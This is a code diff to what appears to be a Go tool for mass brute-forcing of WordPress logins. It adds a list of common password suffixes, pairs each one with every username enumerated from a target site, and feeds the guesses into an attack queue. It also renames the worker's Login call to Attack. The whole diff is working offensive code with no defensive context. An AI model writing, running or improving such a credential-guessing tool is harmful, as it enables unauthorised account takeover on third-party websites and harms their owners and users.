@@ -1,6 +1,7 @@
 package module
 
 import (
+	"fmt"
 	"io/ioutil"
 	"log"
 	"strings"
@@ -13,6 +14,26 @@ var SiteQueue = make(chan string)
 var LogFile string
 var lock sync.Mutex
 var Wg = &sync.WaitGroup{}
+var Rule = []string{
+	"",
+	"123",
+	"@123",
+	"12345",
+	"123456",
+	"@123456",
+	"!@#123",
+	"123!@#",
+	"1",
+	"111",
+	"11",
+	"2",
+	"12",
+	"22",
+	"456",
+	"345",
+	"789",
+	"13",
+}
 
 func ReadListToArray(f string, a *[]string) {
 	if data, err := ioutil.ReadFile(f); err != nil {
@@ -35,7 +56,7 @@ func NewWork(attackType string) {
 		select {
 		case t := <-TaskQueue:
 			//log.Println("Get Task ", t)
-			w.Login(t)
+			w.Attack(t)
 		case <-time.After(30 * time.Second):
 			Wg.Done()
 			return
@@ -43,14 +64,23 @@ func NewWork(attackType string) {
 	}
 }
 func NewSend(passlist []string, userlist []string, max int) {
+	wp := NewWpGo("")
 	for {
 		select {
 		case t := <-SiteQueue:
-			user := BatchGetUser(t, max)
+			user := BatchGetUser(wp, t, max)
 			if len(userlist) > 0 {
 				user = append(user, userlist...)
 			}
 			for _, u := range user {
+				for _, rule := range Rule {
+					tt := SiteTask{
+						Host: t,
+						User: u,
+						Pass: fmt.Sprintf("%s%s", u, rule),
+					}
+					TaskQueue <- tt
+				}
 				for _, p := range passlist {
 					tt := SiteTask{
 						Host: t,
@@ -66,8 +96,7 @@ func NewSend(passlist []string, userlist []string, max int) {
 		}
 	}
 }
-func BatchGetUser(host string, max int) []string {
-	w := WpGo{}
+func BatchGetUser(w *WpGo, host string, max int) []string {
 	var users []string
 	for i := 0; i < max; i++ {
 		u := w.GetUser(host, i)
